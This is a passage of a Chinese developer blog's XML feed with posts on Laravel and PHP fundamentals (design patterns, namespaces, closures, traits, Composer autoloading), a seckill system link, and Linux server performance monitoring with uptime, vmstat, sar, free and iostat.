class="string">"radius"</span>]=&gt;</span><br><span class="line">  int(1)</span><br><span class="line">  [<span class="string">"center"</span>]=&gt;</span><br><span class="line">  object(Point)<span class="comment">#9 (2) &#123;</span></span><br><span class="line">    [<span class="string">"x"</span>]=&gt;</span><br><span class="line">    object(Parents)<span class="comment">#14 (2) &#123;</span></span><br><span class="line">      [<span class="string">"a"</span>]=&gt;</span><br><span class="line">      int(0)</span><br><span class="line">      [<span class="string">"b"</span>]=&gt;</span><br><span class="line">      int(0)</span><br><span class="line">    &#125;</span><br><span class="line">    [<span class="string">"y"</span>]=&gt;</span><br><span class="line">    NULL</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>秒杀系统学习</title>
      <link href="/2018/10/06/%E7%A7%92%E6%9D%80%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0/"/>
      <url>/2018/10/06/%E7%A7%92%E6%9D%80%E7%B3%BB%E7%BB%9F%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>典型完整的秒杀系统学习与设计实现能够让我们对同个类型的处理大流量并发入库问题有一个上帝视角的看待。</p><a id="more"></a><p><a href="https://www.imooc.com/article/25596" target="_blank" rel="noopener">总结</a></p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>laravel框架学习之重要的设计模式</title>
      <link href="/2018/10/06/laravel%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%B6%89%E5%8F%8A%E5%88%B0%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"/>
      <url>/2018/10/06/laravel%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%B6%89%E5%8F%8A%E5%88%B0%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p>总是说很重要的设计模式了解一下</p><a id="more"></a><p>本着组件化的思想（逃，其实是懒，这里放出我觉得能理解的文章的文章</p><h1 id="简单工厂模式"><a href="#简单工厂模式" class="headerlink" title="简单工厂模式"></a>简单工厂模式</h1><p>之前写过，可参考<a href="https://blog.xhzyxed.cn/2018/09/14/php%E6%A0%B8%E5%BF%83%E5%AD%A6%E4%B9%A0-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0-%E7%AE%80%E5%8D%95%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F%E4%BB%A5%E5%8F%8A%E6%94%B9%E8%BF%9B%E7%9A%84%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/">简单工厂模式</a></p><p>工厂模式也是我们学习laravel核心的IoC容器的基础</p><h1 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h1><p>也可参考之前写的<a href="https://blog.xhzyxed.cn/2018/09/14/php%E6%A0%B8%E5%BF%83%E5%AD%A6%E4%B9%A0-%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0-%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/">单例模式</a></p><h1 id="IoC（控制反转模式）"><a href="#IoC（控制反转模式）" class="headerlink" title="IoC（控制反转模式）"></a>IoC（控制反转模式）</h1><p>控制反转是将组件间的依赖关系从程序内部提到外部容器来管理,最简单的的理解就是将会变动的地方拿出来给</p><p>IoC模式也是我们学习laravel核心的IoC容器的重中之重接下来我们来理清什么控制反转</p><h1 id="DI（依赖注入模式）"><a href="#DI（依赖注入模式）" class="headerlink" title="DI（依赖注入模式）"></a>DI（依赖注入模式）</h1><p>最简单的理解依赖注入是指组件的依赖通过外部以参数或其他形式注入</p><p>DI模式也是我们学习laravel核心-IoC容器的重中之重</p><p>上述两种模式对于理解laravelIoC容器非常重要，<a href="https://www.cnblogs.com/lishanlei/p/7627367.html" target="_blank" rel="noopener">laravel服务容器—–深入理解控制反转（IoC）和依赖注入（DI）</a></p><h1 id="装饰器模式"><a href="#装饰器模式" class="headerlink" title="装饰器模式"></a>装饰器模式</h1><p>装饰器模式也是我们学习laravel中间件的基础</p><p>可参考这个<a href="https://www.cnblogs.com/firstForEver/p/8001711.html" target="_blank" rel="noopener">装饰器模式以及Laravel框架下的中间件应用</a></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>laravel框架学习之需要了解的php基础</title>
      <link href="/2018/10/06/laravel%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9C%80%E8%A6%81%E4%BA%86%E8%A7%A3%E7%9A%84php%E5%9F%BA%E7%A1%80/"/>
      <url>/2018/10/06/laravel%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0%E4%B9%8B%E9%9C%80%E8%A6%81%E4%BA%86%E8%A7%A3%E7%9A%84php%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p>命名空间，匿名函数，反射机制，后期静态绑定，了解一下<br><a id="more"></a></p><p>总是有人说，php基础好才能够学习laravel，那么我们需要知道php哪些基础呢？我罗列了下，大概有以下几种：</p><ul><li>熟悉面向对象编程的</li><li>熟悉面向接口编程的</li><li>知匿名函数</li><li>熟悉反射</li><li>命名空间</li><li>设计模式</li><li>composer</li><li>PSR 规范<br>接下来，划重点般介绍下这些基础</li></ul><h1 id="命名空间"><a href="#命名空间" class="headerlink" title="命名空间"></a>命名空间</h1><h2 id="命名空间的作用"><a href="#命名空间的作用" class="headerlink" title="命名空间的作用"></a>命名空间的作用</h2><ul><li>解决命名冲突</li><li>为组件化提供可能，通过命名空间来组织文件，使得组件的文件路径与命名空间具有一定关系，最终通过命名空间找到相应的文件</li></ul><h2 id="命名空间的使用规则"><a href="#命名空间的使用规则" class="headerlink" title="命名空间的使用规则"></a>命名空间的使用规则</h2><p><img src="命名空间的使用.png" alt="命名空间的使用规则"></p><h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>include和require，两者作用几乎一样，只是处理脚本方式不同，require在出错时产生E_COMPILE_EROR级别的错误，会导致脚本运行中止，include会产生E_WARNING级别的错误，只会发出警告，脚本继续运行。</p><h2 id="类的自动加载"><a href="#类的自动加载" class="headerlink" title="类的自动加载"></a>类的自动加载</h2><ul><li><p>魔术方法__autoload(string $class)</p></li><li><p>函数spl_autoload_register 注册给定的函数作为__autoload的实现</p></li></ul><h1 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h1><p>匿名函数的存在既可以作为参数传给函数，也可以作为变量赋值，进而控制函数的执行过程</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$array</span> = array(1,2,3,4);</span><br><span class="line">array_walk(<span class="variable">$array</span>,<span class="keyword">function</span>(<span class="variable">$value</span>)&#123;<span class="built_in">echo</span> <span class="variable">$value</span>&#125;);</span><br></pre></td></tr></table></figure><p>使用外部变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">getCounter</span></span>()&#123;</span><br><span class="line"><span class="variable">$i</span>=0;</span><br><span class="line"><span class="built_in">return</span> <span class="keyword">function</span> use(<span class="variable">$i</span>)&#123;</span><br><span class="line"><span class="built_in">echo</span> ++<span class="variable">$i</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$counter</span> = getCounter();</span><br><span class="line"><span class="variable">$counter</span>();</span><br><span class="line"><span class="variable">$counter</span>();</span><br><span class="line">输出:1 1</span><br></pre></td></tr></table></figure><h1 id="php魔术方法"><a href="#php魔术方法" class="headerlink" title="php魔术方法"></a>php魔术方法</h1><p>魔术方法通常椒在特定的时机被PHP系统自动调用，可以通俗地理解为系统事件监听方法，在事件发生时才出发执行，与嵌入式系统中的中断函数类似，通常以__打头的方法都作为魔术方法</p><p>常用的魔术方法</p><p><img src="魔术方法1.png" alt="常用的魔术方法"><br><img src="魔术方法2.png" alt="常用的魔术方法"></p><h1 id="php魔术常量"><a href="#php魔术常量" class="headerlink" title="php魔术常量"></a>php魔术常量</h1><p><img src="魔术常量.png" alt="魔术常量"></p><h1 id="反射机制"><a href="#反射机制" class="headerlink" title="反射机制"></a>反射机制</h1><p>反射机制主要用来动态地获取系统中类，实例对象，方法等语言构件的信息，通过反射API函数可以实现对这些语言构建信息的动态获取和动态操作等</p><p>具体可参考<a href="https://www.cnblogs.com/nixi8/p/5176213.html" target="_blank" rel="noopener">php反射机制</a></p><h1 id="后期静态绑定"><a href="#后期静态绑定" class="headerlink" title="后期静态绑定"></a>后期静态绑定</h1><p>使用关键字static来实现，通过这种机制，static::不再被解析为定义当前方法所在的类，而是实际运行时计算得到的，即为运行时最初调用的类，可类比js中的this的使用。</p><p><img src="后期静态绑定.png" alt="后期静态绑定"></p><h1 id="trait"><a href="#trait" class="headerlink" title="trait"></a>trait</h1><p>弥补了单继承的缺点，很简洁的实现代码复用</p><ul><li><p>用法：通过在类中使用use 关键字，声明要组合的Trait名称，具体的Trait的声明使用Trait关键词，Trait不能实例化</p></li><li><p>Trait中的方法或属性会覆盖 基类中的同名的方法或属性，而本类会覆盖Trait中同名的属性或方法</p></li></ul><p>具体可参考<a href="https://oomusou.io/php/php-trait/" target="_blank" rel="noopener">如何使用Trait?</a></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>laravel框架学习之组件化</title>
      <link href="/2018/10/05/laravel%E7%BB%84%E4%BB%B6%E5%8C%96/"/>
      <url>/2018/10/05/laravel%E7%BB%84%E4%BB%B6%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>组件化开发了解一下<br><a id="more"></a></p><h1 id="组件化开发"><a href="#组件化开发" class="headerlink" title="组件化开发"></a>组件化开发</h1><p>组件话开发的目的就是能够使用已有的程序模块构建项目，甚至可以快速更换项目中的相应模块而不需要系统中其他部分的代码，这就需要所有代码按照一定的规范和接口来实现</p><h2 id="PSR标准"><a href="#PSR标准" class="headerlink" title="PSR标准"></a>PSR标准</h2><p>主要有PSR-0和PSR-4，这两个文档主要制定了Autoloader标准即代码自动加载标准</p><h2 id="composer"><a href="#composer" class="headerlink" title="composer"></a>composer</h2><p>composer是一个组件管理工具，具体安装可参照官网</p><h3 id="自动加载"><a href="#自动加载" class="headerlink" title="自动加载"></a>自动加载</h3><p>四种文件自动加载的规范形式,这四种形式本质上是定义了一个命名空间到实际文件的引蛇的映射关系，通过这个映射关系，可以利用命名空间类精确定位到相应文件的具体路径，进而实现自动加载功能</p><ul><li>PSR-0</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">"autoload"</span>:&#123;</span><br><span class="line"><span class="string">"psr-0"</span>:&#123;<span class="string">"App\\"</span>:<span class="string">"app/"</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述配置文件使用PSR-0定义了映射关系，即命名空间App\对应目录app/,当使用$user=new \App\User()语句实例化App\User类时，PSR-0规范下，需要创建一个app/App/User.php,则该文件需要包含App\User类，</p><ul><li>PSR-4</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">"autoload"</span>:&#123;</span><br><span class="line"><span class="string">"psr-4"</span>:&#123;<span class="string">"App\\"</span>:<span class="string">"app/"</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述配置文件使用PSR-4定义了映射关系，即命名空间App\对应目录app/,当使用$user=new \App\User()语句实例化App\User类时，PSR-4规范下，需要创建一个app/User.php,则该文件需要包含App\User类，与上的区别是无需新建命名空间的目录</p><ul><li>classmap<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">"autoload"</span>:&#123;</span><br><span class="line"><span class="string">"classmap"</span>:[<span class="string">"database"</span>]</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>扫描指定目录中所有的.php和.inc文件，并加载到autoload_classmap.php文件中，在该文件中实现一个具体类与文件映射的关联数组</p><ul><li>files</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">"files"</span>:&#123;</span><br><span class="line"><span class="string">"src/Illuminate/Foundation/helpers.php"</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于在每次程序执行时都需要载入的文件，可以通过files规范实现自动加载，经常使用的函数库文件就可以使用这种载入模式</p><h3 id="常见的命令"><a href="#常见的命令" class="headerlink" title="常见的命令"></a>常见的命令</h3><p><img src="composer.png" alt="常见的命令"></p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Linux服务器性能分析</title>
      <link href="/2018/10/03/Linux%E6%9C%8D%E5%8A%A1%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90/"/>
      <url>/2018/10/03/Linux%E6%9C%8D%E5%8A%A1%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<p>了解影响Linux服务器性能的因素，CPU,内存，硬盘<br><a id="more"></a></p><h1 id="系统整体性能评估（uptime命令）"><a href="#系统整体性能评估（uptime命令）" class="headerlink" title="系统整体性能评估（uptime命令）"></a>系统整体性能评估（uptime命令）</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[root@web1 ~]<span class="comment"># uptime</span></span><br><span class="line">16:38:00 up 118 days,  3:01,  5 users,  load average: 1.22, 1.02, 0.91</span><br></pre></td></tr></table></figure><p>这里需要注意的是：load average这个输出值，这三个值的大小一般不能大于系统CPU的个数，例如，本输出中系统有8个CPU,如果load average的三个值长期大于8时，说明CPU很繁忙，负载很高，可能会影响系统性能，但是偶尔大于8时，倒不用担心，一般不会影响系统性能。相反，如果load average的输出值小于CPU的个数，则表示CPU还有空闲的时间片，比如本例中的输出，CPU是非常空闲的</p><h1 id="cpu性能评估"><a href="#cpu性能评估" class="headerlink" title="cpu性能评估"></a>cpu性能评估</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@node1 ~]<span class="comment"># vmstat 2 3    #每2秒更新信息，统计3次</span></span><br><span class="line">procs -----------memory----------  ---swap--  -----io---- --system--  -----cpu------</span><br><span class="line"> r  b   swpd   free      buff  cache   si   so    bi    bo       <span class="keyword">in</span>     cs     us sy  id   wa st</span><br><span class="line"> 0  0    0    162240   8304  67032   0    0    13    21   1007   23     0  1   98   0   0</span><br><span class="line"> 0  0    0    162240   8304  67032   0    0     1     0     1010   20     0  1   100 0   0</span><br><span class="line"> 0  0    0    162240   8304  67032   0    0     1     1     1009   18     0  1    99  0   0</span><br></pre></td></tr></table></figure><ul><li><p>Procs<br>  r列表示运行和等待cpu时间片的进程数，这个值如果长期大于系统CPU的个数，说明CPU不足，需要增加CPU。<br>  b列表示在等待资源的进程数，比如正在等待I/O、或者内存交换等。</p></li><li><p>Cpu<br>  us列显示了用户进程消耗的CPU 时间百分比。us的值比较高时，说明用户进程消耗的cpu时间多，但是如果长期大于50%，就需要考虑优化程序或算法。<br>  sy列显示了内核进程消耗的CPU时间百分比。Sy的值较高时，说明内核消耗的CPU资源很多。<br>  根据经验，us+sy的参考值为80%，如果us+sy大于 80%说明可能存在CPU资源不足。</p></li></ul><h1 id="利用sar命令监控系统CPU"><a href="#利用sar命令监控系统CPU" class="headerlink" title="利用sar命令监控系统CPU"></a>利用sar命令监控系统CPU</h1><p>sar功能很强大，可以对系统的每个方面进行单独的统计，但是使用sar命令会增加系统开销，不过这些开销是可以评估的，对系统的统计结果不会有很大影响。<br>下面是sar命令对某个系统的CPU统计输出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@webserver ~]<span class="comment"># sar -u 3 5 #u显示系统所有cpu在采样时间内的负载状态</span></span><br><span class="line">Linux 2.6.9-42.ELsmp (webserver)        11/28/2008      _i686_  (8 CPU)</span><br><span class="line">11:41:24 AM     CPU     %user     %nice   %system   %iowait    %steal     %idle</span><br><span class="line">11:41:27 AM     all      0.88      0.00      0.29      0.00      0.00     98.83</span><br><span class="line">11:41:30 AM     all      0.13      0.00      0.17      0.21      0.00     99.50</span><br><span class="line">11:41:33 AM     all      0.04      0.00      0.04      0.00      0.00     99.92</span><br><span class="line">11:41:36 AM     all      90.08     0.00      0.13      0.16      0.00     9.63</span><br><span class="line">11:41:39 AM     all      0.38      0.00      0.17      0.04      0.00     99.41</span><br><span class="line">Average:        all      0.34      0.00      0.16      0.05      0.00     99.45</span><br></pre></td></tr></table></figure><p>对上面每项的输出解释如下：</p><ul><li>    %user列显示了用户进程消耗的CPU 时间百分比。</li><li>    %nice列显示了运行正常进程所消耗的CPU 时间百分比。</li><li>    %system列显示了系统进程消耗的CPU时间百分比。</li><li>    %iowait列显示了IO等待所占用的CPU时间百分比</li><li>    %steal列显示了在内存相对紧张的环境下pagein强制对不同的页面进行的steal操作 。</li><li>    %idle列显示了CPU处在空闲状态的时间百分比。</li></ul><h1 id="内存性能评估"><a href="#内存性能评估" class="headerlink" title="内存性能评估"></a>内存性能评估</h1><h2 id="利用free指令监控内存"><a href="#利用free指令监控内存" class="headerlink" title="利用free指令监控内存"></a>利用free指令监控内存</h2><p>free是监控linux内存使用状况最常用的指令，看下面的一个输出：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@webserver ~]<span class="comment"># free  -m  #查看以M为单位的内存使用情况</span></span><br><span class="line">                total         used       free     shared    buffers     cached</span><br><span class="line">Mem:       8111       7185        926          0        243           6299</span><br><span class="line">-/+ buffers/cache:     643       7468</span><br><span class="line">Swap:       8189          0         8189</span><br></pre></td></tr></table></figure></p><p>一般有这样一个经验公式：应用程序可用内存/系统物理内存&gt;70%时，表示系统内存资源非常充足，不影响系统性能，应用程序可用内存/系统物理内存&lt;20%时，表示系统内存资源紧缺，需要增加系统内存，20%&lt;应用程序可用内存/系统物理内存&lt;70%时，表示系统内存资源基本能满足应用需求，暂时不影响系统性能。 </p><h2 id="利用vmstat命令监控内存"><a href="#利用vmstat命令监控内存" class="headerlink" title="利用vmstat命令监控内存"></a>利用vmstat命令监控内存</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@node1 ~]<span class="comment"># vmstat 2 3</span></span><br><span class="line">procs -----------memory----------  ---swap--  -----io---- --system--  -----cpu------</span><br><span class="line"> r  b   swpd   free      buff  cache   si   so    bi    bo       <span class="keyword">in</span>     cs     us sy  id  wa st</span><br><span class="line"> 0  0    0    162240   8304  67032   0    0    13    21   1007   23     0  1  98   0  0</span><br><span class="line"> 0  0    0    162240   8304  67032   0    0     1     0     1010   20     0  1  100 0  0</span><br><span class="line"> 0  0    0    162240   8304  67032   0    0     1     1     1009   18     0  1  99   0  0</span><br></pre></td></tr></table></figure><ul><li>memory</li></ul><p>swpd列表示切换到内存交换区的内存数量（以k为单位）。如果swpd的值不为0，或者比较大，只要si、so的值长期为0，这种情况下一般不用担心，不会影响系统性能。<br>free列表示当前空闲的物理内存数量（以k为单位）<br>buff列表示buffers cache的内存数量，一般对块设备的读写才需要缓冲。<br>cache列表示page cached的内存数量，一般作为文件系统cached，频繁访问的文件都会被cached，如果cache值较大，说明cached的文件数较多，如果此时IO中bi比较小，说明文件系统效率比较好。</p><ul><li>swap</li></ul><p>si列表示由磁盘调入内存，也就是内存进入内存交换区的数量。<br>so列表示由内存调入磁盘，也就是内存交换区进入内存的数量。<br>一般情况下，si、so的值都为0，如果si、so的值长期不为0，则表示系统内存不足。需要增加系统内存。</p><h1 id="磁盘性能评估"><a href="#磁盘性能评估" class="headerlink" title="磁盘性能评估"></a>磁盘性能评估</h1><h2 id="利用iostat评估磁盘性能"><a href="#利用iostat评估磁盘性能" class="headerlink" title="利用iostat评估磁盘性能"></a>利用iostat评估磁盘性能</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@webserver ~]<span class="comment">#   iostat -d 2 3  #-d 显示磁盘的使用情况</span></span><br><span class="line">Linux 2.6.9-42.ELsmp (webserver)        12/01/2008      _i686_  (8 CPU)</span><br><span class="line"> </span><br><span class="line">Device:         tps   Blk_read/s   Blk_wrtn/s   Blk_read      Blk_wrtn</span><br><span class="line">sda               1.87         2.58       114.12        6479462     286537372</span><br><span class="line"> </span><br><span class="line">Device:         tps   Blk_read/s   Blk_wrtn/s   Blk_read   Blk_wrtn</span><br><span class="line">sda               0.00         0.00         0.00              0                0</span><br><span class="line"> </span><br><span class="line">Device:         tps   Blk_read/s   Blk_wrtn/s   Blk_read    Blk_wrtn</span><br><span class="line">sda               1.00         0.00        12.00             0                24</span><br></pre></td></tr></table></figure><p>对上面每项的输出解释如下：<br>Blk_read/s表示每秒读取的数据块数。<br>Blk_wrtn/s表示每秒写入的数据块数。<br>Blk_read表示读取的所有块数。<br>Blk_wrtn表示写入的所有块数。<br>         可以通过Blk_read/s和Blk_wrtn/s的值对磁盘的读写性能有一个基本的了解，如果Blk_wrtn/s值很大，表示磁盘的写操作很频繁，可以考虑优化磁盘或者优化程序，如果Blk_read/s值很大，表示磁盘直接读取操作很多，可以将读取的数据放入内存中进行操作。<br>         对于这两个选项的值没有一个固定的大小，根据系统应用的不同，会有不同的值，但是有一个规则还是可以遵循的：长期的、超大的数据读写，肯定是不正常的，这种情况一定会影响系统性能。</p><h2 id="利用sar评估磁盘性能"><a href="#利用sar评估磁盘性能" class="headerlink" title="利用sar评估磁盘性能"></a>利用sar评估磁盘性能</h2><p>通过“sar –d”组合，可以对系统的磁盘IO做一个基本的统计，请看下面的一个输出：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@webserver ~]<span class="comment"># sar -d 2 3</span></span><br><span class="line">Linux 2.6.9-42.ELsmp (webserver)        11/30/2008      _i686_  (8 CPU)</span><br><span class="line"> </span><br><span class="line">11:09:33 PM  DEV     tps   rd_sec/s   wr_sec/s  avgrq-sz  avgqu-sz   await  svctm   %util</span><br><span class="line">11:09:35 PM dev8-0  0.00  0.00            0.00        0.00          0.00         0.00   0.00     0.00</span><br><span class="line"> </span><br><span class="line">11:09:35 PM  DEV     tps  rd_sec/s    wr_sec/s  avgrq-sz  avgqu-sz  await   svctm   %util</span><br><span class="line">11:09:37 PM dev8-0  1.00  0.00         12.00        12.00         0.00        0.00    0.00     0.00</span><br><span class="line"> </span><br><span class="line">11:09:37 PM   DEV    tps    rd_sec/s  wr_sec/s   avgrq-sz  avgqu-sz  await  svctm   %util</span><br><span class="line">11:09:39 PM dev8-0  1.99   0.00         47.76         24.00       0.00        0.50    0.25     0.05</span><br><span class="line"> </span><br><span class="line">Average:  DEV          tps    rd_sec/s   wr_sec/s  avgrq-sz  avgqu-sz    await  svctm   %util</span><br><span class="line">Average:  dev8-0      1.00   0.00          19.97         20.00       0.00         0.33    0.17     0.02</span><br></pre></td></tr></table></figure></p><p>需要关注的几个参数含义：</p><ul><li>await表示平均每次设备I/O操作的等待时间（以毫秒为单位）。</li><li>svctm表示平均每次设备I/O操作的服务时间（以毫秒为单位）。</li><li>%util表示一秒中有百分之几的时间用于I/O操作。</li></ul><p>对以磁盘IO性能，一般有如下评判标准：</p><ul><li>正常情况下svctm应该是小于await值的，而svctm的大小和磁盘性能有关，CPU、内存的负荷也会对svctm值造成影响，过多的请求也会间接的导致svctm值的增加。</li><li>await值的大小一般取决与svctm的值和I/O队列长度以及I/O请求模式，如果svctm的值与await很接近，表示几乎没有I/O等待，磁盘性能很好，如果await的值远高于svctm的值，则表示I/O队列等待太长，系统上运行的应用程序将变慢，此时可以通过更换更快的硬盘来解决问题。</li><li>%util项的值也是衡量磁盘I/O的一个重要指标，如果%util接近100%，表示磁盘产生的I/O请求太多，I/O系统已经满负荷的在工作，该磁盘可能存在瓶颈。长期下去，势必影响系统的性能，可以通过优化程序或者通过更换更高、更快的磁盘来解决此问题。</li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>laravel框架学习</title>
      <link href="/2018/10/02/%E9%80%9F%E8%AF%BBlaravel%E6%BA%90%E7%A0%81/"/>
      <url>/2018/10/02/%E9%80%9F%E8%AF%BBlaravel%E6%BA%90%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<p>详细了解laravel设计思想以及涉及到的php知识点，对我们开发成长，大有裨益。</p><a id="more"></a><p>laravel是一个很棒的面向对象的开源项目，不仅仅是作为一个所谓的优雅的web框架，主要可以总结如下几点：</p><ul><li>简洁而清晰地路由定义方式</li><li>强大的IoC容器</li><li>合理的框架结构</li><li>丰富的第三方库以及可自定义组件</li></ul><p>现在就开始我们的折腾之旅把</p><ul><li><a href="/2018/10/05/laravel组件化/">laravel组件化</a></li><li><a href="/2018/10/06/laravel框架学习之需要了解的php基础/">laravel框架学习之需要了解的php基础</a></li><li><a href="/2018/10/06/laravel框架学习之涉及到的设计模式/">laravel框架学习之涉及到的设计模式</a></li><li><a href="/2018/10/09/​类的反射和依赖注入/">​类的反射和依赖注入</a></li><li><a href="/2018/10/09/laravel请求到响应的整个过程/">laravel请求到响应的整个过程</a></li><li><a href="/2018/10/09/laravel学习之服务容器/">laravel学习之服务容器</a></li><li><a href="/2018/10/10/laravel学习之服务提供者/">laravel学习之服务提供者</a></li><li><a href="/2018/10/11/laravel学习之Facades/">laravel学习之Facades</a></li><li><a href="/2018/10/14/laravel学习之中间件/">laravel学习之中间件</a></li><li><a href="/2018/10/17/laravel学习之路由/">laravel学习之路由</a></li><li><a href="/2018/10/20/laravel学习之Request/">laravel学习之Request</a></li><li><a href="/2018/10/20/laravel学习之Response/">laravel学习之Response</a></li></ul><p>注：以上文章均参考网上文章或书籍以及自己的学习节奏整理出来</p>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>lnmp技术栈文章汇总</title>
      <link href="/2018/10/02/lnmp%E6%8A%80%E6%9C%AF%E6%A0%88%E6%96%87%E7%AB%A0%E6%B1%87%E6%80%BB/"/>
      <url>/2018/10/02/lnmp%E6%8A%80%E6%9C%AF%E6%A0%88%E6%96%87%E7%AB%A0%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<p>lnmp技术栈，有针对性的学习，成长的更快,博客lnmp技术栈文章汇总如下:</p><a id="more"></a><ul><li><a href="https://blog.xhzyxed.cn/categories/Linux/">Linux</a></li><li><a href="https://blog.xhzyxed.cn/categories/Nginx/">Nginx</a></li><li><a href="https://blog.xhzyxed.cn/categories/mysql/">Mysql</a></li><li><a href="https://blog.xhzyxed.cn/categories/php/">PHP</a></li></ul><p>项目部署</p><ul><li><a href="/2018/10/31/deployer的使用报告/">Deployer快速部署项目</a></li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>高性能mysql学习笔记-查询性能优化</title>
